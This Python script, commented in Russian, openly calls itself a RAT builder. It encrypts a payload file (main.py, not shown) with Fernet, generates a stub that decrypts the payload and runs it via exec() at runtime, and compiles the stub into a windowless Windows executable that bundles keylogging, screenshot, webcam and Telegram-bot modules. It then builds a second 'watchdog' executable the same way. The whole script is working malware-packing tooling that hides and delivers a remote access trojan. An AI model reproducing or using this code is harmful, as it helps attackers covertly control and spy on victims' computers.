from base64 import b64encode
import cx_Freeze
from art import tprint

import ctypes
from datetime import datetime
import os
import platform
import subprocess
import requests
import wget
import pyautogui
import keyboard
import telebot
from cryptography.fernet import Fernet
import cv2

# Выводим лого
tprint('Compiler')


# Функция компилятора
def compile(name, description, version, included_modules):
    build_exe_options = {
        'include_msvcr': True,
        'includes': included_modules
    }

    executable = cx_Freeze.Executable(
        script='for_compile.py',
        targetName=f'{name}.exe',
        base='Win32GUI',
        icon=''
    )

    build = cx_Freeze.Build(
        executable=executable,
        build_exe_options=build_exe_options
    )

    cx_Freeze.setup(
        name=name,
        version=version,
        description=description,
        options={'build': build},
        executables=executable
    )


# Функция внедрения декодера в файл
def encrypt(filename, key, keyname):
    # Зашифруем файл и записываем его
    f = Fernet(key)
    with open(filename, "rb") as file:
        # Читаем файл
        data = file.read()
    encrypted_data = f.encrypt(data)
    encrypted_data_b64 = b64encode(encrypted_data)
    decoder = f'''
from cryptography.fernet import Fernet
import os
from base64 import b64encode, b64decode
import sys

try:
    key = open("{keyname}.key", "rb").read()
except:
    sys.exit("")


def decrypt(key):
    f = Fernet(key)
    _for_decryption = "{encrypted_data_b64.decode('windows-1251')}"
    decoded_encrypted_data = b64decode(_for_decryption)
    for_write = f.decrypt(decoded_encrypted_data).decode('windows-1251')
    exec(for_write)

decrypt(key)
'''
    with open('for_compile.py', 'w') as file:
        file.write(decoder)


# Генерация ключа декода
def write_key(keyname):
    # Создаем ключ и сохраняем его в файл
    key = Fernet.generate_key()
    with open(f'{keyname}.key', 'wb') as key_file:
        key_file.write(key)


name = 'main'#input('\n* Введите название файла:\n* > ')
description = 'test'#input('\n* Введите описание файла:\n* > ')
version = '2'#input('\n* Введите версию файла:\n* > ')

included_modules = ['os', 'sys', 'ctypes', 'datetime', 'platform', 'subprocess',
                    'requests', 'wget', 'pyautogui', 'keyboard', 'telebot', 'cryptography']

print('\n* Данные записаны, начинаю писать декодер исходного кода и генерировать файл для компиляции...')

keyname = 'activation'

write_key(keyname)

key = open(f'{keyname}.key', 'rb').read()

encrypt('main.py', key, keyname)

print('\n* Компилирую RAT...')
compile(name, description, version, included_modules)

name = input('\n* Введите название файла:\n* > ')
description = input('\n* Введите описание файла:\n* > ')
version = input('\n* Введите версию файла:\n* > ')

included_modules = ['asyncio', 'ctypes', 'datetime', 'os', 'platform', 'subprocess', 'requests', 'wget', 'pyautogui', 'keyboard', 'telebot', 'cryptography', 'cv2', 'tkinter', 'messagebox', 'ctypes', 'sys']

print('\n* RAT готов, подготавливаю watchdog...')

print('\n* Данные записаны, начинаю писать декодер исходного кода и генерировать файл для компиляции...')

keyname = 'install'
write_key(keyname)
key = open(f'{keyname}.key', 'rb').read()

encrypt('main.py', key, keyname)
print('\n* Компилирую...')

compile(name, description, version, included_modules)
